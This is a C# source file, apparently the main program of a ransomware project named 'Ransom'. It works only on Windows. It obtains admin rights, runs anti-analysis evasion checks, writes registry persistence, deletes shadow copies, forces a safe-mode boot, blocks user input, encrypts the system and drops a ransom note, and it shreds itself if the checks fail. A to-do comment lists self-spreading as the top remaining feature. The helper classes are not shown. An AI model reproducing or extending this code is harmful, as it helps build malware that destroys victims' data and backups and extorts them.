using Shared;

namespace Ransom
{
    /* TO DO
     * Spread  (Most imporant)
     * Decrypt  (Can be skipped)
     * Server  (Not important)
    */

    class Program
    {
        private const bool HIDE_CONSOLE = false;

        private static readonly Ransomware ransomware = new();
        private static readonly Evador evador = new();

        private static void Main(string[] args)
        {
            MainAsync().GetAwaiter().GetResult();
        }

        private static async Task MainAsync()
        {
            if (!Evador.IsWindows())
                return;
            
            await Run();
        }

        private static async Task Run()
        {
            if (ElevatePrivs.TryGetAdmin())
            {
                Console.WriteLine("Got a session with elevated privileges");
                HideConsole(HIDE_CONSOLE);

                if (ransomware.AlreadyExecuted())
                {
                    Console.WriteLine("Already executed.");
                    if (Evador.IsOnSafeMode())
                    {
                        Console.WriteLine("Launching the ransomware");
                        ExecuteRansomware();
                    }
                    else
                    {
                        ransomware.DeleteShadowCopies();
                        Ransomware.ChangeBootState(true);
                    }
                }
                else
                {
                    Console.WriteLine("Didn't execute before.");
                    Console.WriteLine("Doing security checks");
                    if (await evador.EvadeDetection())
                    {
                        Console.WriteLine("Passed the security checks");
                        Console.WriteLine("Writing to registry");
                        ransomware.BecomePersistent();

                        if (Evador.IsOnSafeMode())
                        {
                            Console.WriteLine("Launching the ransomware");
                            ExecuteRansomware();
                        }
                        else
                        {
                            ransomware.DeleteShadowCopies();
                            Ransomware.ChangeBootState(true);
                        }
                    }
                    else
                    {
                        Console.WriteLine("Didn't pass the security checks.");
                        Utility.ShredFile(Settings.CURRENT_PATH);
                    }
                }
            }
        }

        private static void ExecuteRansomware()
        {
            Utility.BlockInput(true);
            ransomware.EncryptSystem();

            Utility.BlockInput(false);
            Ransomware.CreateNote(true);
            ransomware.RestoreRegistryKeys();
        }
        
        private static void HideConsole(bool hide)
        {
            IntPtr handle = NativeMethods.GetConsoleWindow();
            if (hide)
                NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
            else
                NativeMethods.ShowWindow(handle, NativeMethods.SW_SHOW);
        }
    }
}
